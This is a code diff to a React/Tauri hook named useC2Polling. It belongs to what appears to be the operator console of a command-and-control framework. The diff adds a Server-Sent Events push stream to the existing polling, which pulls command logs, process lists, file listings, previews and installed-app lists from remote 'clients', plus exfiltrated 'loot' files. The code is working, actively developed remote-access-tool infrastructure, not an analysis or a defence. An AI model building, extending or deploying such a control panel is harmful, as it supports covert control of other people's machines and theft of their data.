@@ -1,6 +1,6 @@
-import { useEffect, useRef } from 'react';
+import { useEffect, useRef, useState, useCallback } from 'react';
 import { invoke } from '@tauri-apps/api/core';
-import type { Client, CommandLog, LootFile, PreviewData } from '../types';
+import type { Client, CommandLog, LootFile, PreviewData, InstalledApp } from '../types';
 
 interface UseC2PollingOpts {
   activeTab: string;
@@ -9,6 +9,7 @@ interface UseC2PollingOpts {
   c2Mode: 'cloud' | 'local';
   c2ServerUrl: string;
   authHeader: Record<string, string>;
+  operatorToken: string;
   setClients: (v: Client[]) => void;
   setLogs: (v: CommandLog[]) => void;
   setLootFiles: (v: LootFile[]) => void;
@@ -17,6 +18,9 @@ interface UseC2PollingOpts {
   setPreviewOpen: (v: boolean) => void;
   setPreviewData: (v: PreviewData | null) => void;
   setIsPreviewLoading: (v: boolean) => void;
+  setAppsList: (v: InstalledApp[]) => void;
+  setIsAppsLoading: (v: boolean) => void;
+  mergeAppIcons: (icons: Record<string, string>) => void;
   parseFileList: (output: string) => void;
   appendTermLog: (lines: string[]) => void;
   setC2ConnectionStatus: (s: 'connected' | 'connecting' | 'error') => void;
@@ -25,10 +29,11 @@ interface UseC2PollingOpts {
 
 export function useC2Polling(opts: UseC2PollingOpts) {
   const {
-    activeTab, isFilesLoading, selectedClientId, c2Mode, c2ServerUrl, authHeader,
+    activeTab, isFilesLoading, selectedClientId, c2Mode, c2ServerUrl, authHeader, operatorToken,
     setClients, setLogs, setLootFiles,
     setProcessList, setIsProcessesLoading,
     setPreviewOpen, setPreviewData, setIsPreviewLoading,
+    setAppsList, setIsAppsLoading, mergeAppIcons,
     parseFileList, appendTermLog,
     setC2ConnectionStatus, showToast,
   } = opts;
@@ -36,12 +41,86 @@ export function useC2Polling(opts: UseC2PollingOpts) {
   const logsRef = useRef<CommandLog[]>([]);
   const printedIdsRef = useRef<Set<number>>(new Set());
   const hadErrorRef = useRef(false);
+  // Highest log id seen via any channel — used as the SSE ?since= cursor
+  const lastLogIdRef = useRef(0);
+  // Mirrors executeCommand's target fallback; read by the SSE handler between polls
+  const targetRef = useRef('');
+  // True while the SSE stream is connected — polling drops to a slow safety net
+  const [sseLive, setSseLive] = useState(false);
 
   // Cap printedIds to avoid unbounded growth
   const MAX_PRINTED = 1000;
 
+  const trackId = useCallback((id: number) => {
+    printedIdsRef.current.add(id);
+    if (printedIdsRef.current.size > MAX_PRINTED) {
+      const arr = Array.from(printedIdsRef.current);
+      printedIdsRef.current = new Set(arr.slice(-MAX_PRINTED));
+    }
+  }, []);
+
+  const noteLogId = useCallback((id: number) => {
+    if (id > lastLogIdRef.current) lastLogIdRef.current = id;
+  }, []);
+
+  // Single processing path shared by the polling fetch and SSE pushes
+  const processLog = useCallback((log: CommandLog) => {
+    if (printedIdsRef.current.has(log.id)) return;
+    noteLogId(log.id);
+    // Only accept structured output from the currently targeted client —
+    // another machine's ls/ps/preview must never hijack this operator's view
+    const fromTarget = !targetRef.current || log.client_id === targetRef.current;
+
+    if (log.output.includes('[JSON_PREVIEW]')) {
+      trackId(log.id);
+      if (!fromTarget) return;
+      try {
+        const parsed = JSON.parse(log.output.replace('[JSON_PREVIEW]', ''));
+        // Surface every outcome — ok, error, unsupported — so the modal
+        // never hangs on its loading spinner
+        setPreviewData(parsed);
+        setIsPreviewLoading(false);
+        if (parsed.status === 'ok') setPreviewOpen(true);
+      } catch {}
+    } else if (log.output.includes('[JSON_APPS]')) {
+      trackId(log.id);
+      if (!fromTarget) return;
+      try {
+        const parsed = JSON.parse(log.output.replace('[JSON_APPS]', ''));
+        setAppsList(parsed.items || []);
+        setIsAppsLoading(false);
+      } catch {
+        setIsAppsLoading(false);
+      }
+    } else if (log.output.includes('[JSON_ICONS]')) {
+      trackId(log.id);
+      if (!fromTarget) return;
+      try {
+        const parsed = JSON.parse(log.output.replace('[JSON_ICONS]', ''));
+        mergeAppIcons(parsed.icons || {});
+      } catch {}
+    } else if (log.output.includes('[JSON_PROCS]')) {
+      trackId(log.id);
+      if (!fromTarget) return;
+      try {
+        const procs = JSON.parse(log.output.replace('[JSON_PROCS]', ''));
+        setProcessList(procs);
+        setIsProcessesLoading(false);
+      } catch {}
+    } else if (log.output.includes('[JSON_FILES]')) {
+      trackId(log.id);
+      if (!fromTarget) return;
+      parseFileList(log.output);
+    } else if (log.status === 'SUCCESS' && log.output && !log.output.startsWith('Queued')) {
+      trackId(log.id);
+      const cmdLabel = log.command || 'Command';
+      appendTermLog([`\n[${cmdLabel}] ${log.client_id}`, log.output]);
+    }
+  }, [noteLogId, trackId, setPreviewData, setIsPreviewLoading, setPreviewOpen, setAppsList, setIsAppsLoading, mergeAppIcons, setProcessList, setIsProcessesLoading, parseFileList, appendTermLog]);
+
   useEffect(() => {
-    const pollInterval = isFilesLoading ? 300 : 750;
+    // While SSE is live it delivers instantly; polling becomes a 10s safety net.
+    const pollInterval = sseLive ? 10000 : (isFilesLoading ? 300 : 750);
     let cancelled = false;
     const abortControllers: AbortController[] = [];
 
@@ -104,55 +183,13 @@ export function useC2Polling(opts: UseC2PollingOpts) {
 
         // Mirror executeCommand's target fallback so we accept output from
         // whichever client commands are actually being sent to
-        const effectiveTarget = selectedClientId && backendClients.some(c => c.id === selectedClientId)
+        targetRef.current = selectedClientId && backendClients.some(c => c.id === selectedClientId)
           ? selectedClientId
           : (backendClients[0]?.id || '');
 
-        const newTermLines: string[] = [];
         // Server returns logs newest-first; process chronologically so older
         // stragglers can never overwrite newer responses in the UI
-        [...backendLogs].reverse().forEach((log) => {
-          if (printedIdsRef.current.has(log.id)) return;
-          // Only accept structured output from the currently targeted client —
-          // another machine's ls/ps/preview must never hijack this operator's view
-          const fromTarget = !effectiveTarget || log.client_id === effectiveTarget;
-          if (log.output.includes('[JSON_PREVIEW]')) {
-            printedIdsRef.current.add(log.id);
-            if (!fromTarget) return;
-            try {
-              const parsed = JSON.parse(log.output.replace('[JSON_PREVIEW]', ''));
-              // Surface every outcome — ok, error, unsupported — so the modal
-              // never hangs on its loading spinner
-              setPreviewData(parsed);
-              setIsPreviewLoading(false);
-              if (parsed.status === 'ok') setPreviewOpen(true);
-            } catch {}
-          } else if (log.output.includes('[JSON_PROCS]')) {
-            printedIdsRef.current.add(log.id);
-            if (!fromTarget) return;
-            try {
-              const jsonStr = log.output.replace('[JSON_PROCS]', '');
-              const procs = JSON.parse(jsonStr);
-              setProcessList(procs);
-              setIsProcessesLoading(false);
-            } catch {}
-          } else if (log.output.includes('[JSON_FILES]')) {
-            printedIdsRef.current.add(log.id);
-            if (!fromTarget) return;
-            parseFileList(log.output);
-          } else if (log.status === 'SUCCESS' && log.output && !log.output.startsWith('Queued')) {
-            printedIdsRef.current.add(log.id);
-            const cmdLabel = log.command || 'Command';
-            newTermLines.push(`\n[${cmdLabel}] ${log.client_id}`, log.output);
-          }
-
-          if (printedIdsRef.current.size > MAX_PRINTED) {
-            const arr = Array.from(printedIdsRef.current);
-            printedIdsRef.current = new Set(arr.slice(-MAX_PRINTED));
-          }
-        });
-
-        if (newTermLines.length) appendTermLog(newTermLines);
+        [...backendLogs].reverse().forEach(processLog);
       } catch {}
     };
 
@@ -163,5 +200,62 @@ export function useC2Polling(opts: UseC2PollingOpts) {
       clearInterval(interval);
       abortControllers.forEach(ac => ac.abort());
     };
-  }, [activeTab, isFilesLoading, selectedClientId, c2Mode, c2ServerUrl, authHeader, setC2ConnectionStatus, showToast, parseFileList, appendTermLog, setClients, setLogs, setLootFiles, setProcessList, setIsProcessesLoading, setPreviewOpen, setPreviewData, setIsPreviewLoading]);
+  }, [activeTab, isFilesLoading, sseLive, selectedClientId, c2Mode, c2ServerUrl, authHeader, setC2ConnectionStatus, showToast, processLog, setClients, setLogs, setLootFiles]);
+
+  // === SSE push stream (cloud mode) — instant results, no polling latency ===
+  useEffect(() => {
+    if (c2Mode !== 'cloud' || !c2ServerUrl || !operatorToken) return;
+    const cleanUrl = c2ServerUrl.replace(/\/+$/, '');
+    let es: EventSource | null = null;
+    let reconnectTimer: ReturnType<typeof setTimeout> | null = null;
+    let disposed = false;
+
+    const connect = () => {
+      if (disposed) return;
+      const url = `${cleanUrl}/api/events?token=${encodeURIComponent(operatorToken)}&since=${lastLogIdRef.current}`;
+      es = new EventSource(url);
+
+      es.onopen = () => setSseLive(true);
+
+      es.onmessage = (msg) => {
+        try {
+          const ev = JSON.parse(msg.data);
+          if (ev.type === 'sync') {
+            if (Array.isArray(ev.clients)) setClients(ev.clients);
+            if (targetRef.current === '' && ev.clients?.[0]) targetRef.current = ev.clients[0].id;
+            // Replay missed logs in chronological order
+            (ev.replay || []).forEach((log: CommandLog) => processLog(log));
+          } else if (ev.type === 'log') {
+            if (ev.log) processLog(ev.log);
+          } else if (ev.type === 'clients') {
+            // Refetch just the client list — cheap, keeps one source of truth
+            fetch(`${cleanUrl}/api/clients`, { headers: authHeader })
+              .then(r => r.ok ? r.json() : null)
+              .then(list => { if (list) setClients(list); })
+              .catch(() => {});
+          } else if (ev.type === 'loot') {
+            invoke<LootFile[]>('get_loot').then(loot => setLootFiles(loot)).catch(() => {});
+          }
+        } catch {}
+      };
+
+      es.onerror = () => {
+        setSseLive(false);
+        es?.close();
+        // EventSource auto-reconnect can loop fast on auth failures —
+        // back off manually and let the polling safety net carry the UI
+        if (!disposed) reconnectTimer = setTimeout(connect, 10000);
+      };
+    };
+
+    connect();
+    return () => {
+      disposed = true;
+      if (reconnectTimer) clearTimeout(reconnectTimer);
+      es?.close();
+      setSseLive(false);
+    };
+  }, [c2Mode, c2ServerUrl, operatorToken, authHeader, processLog, setClients, setLootFiles]);
+
+  return { sseLive };
 }
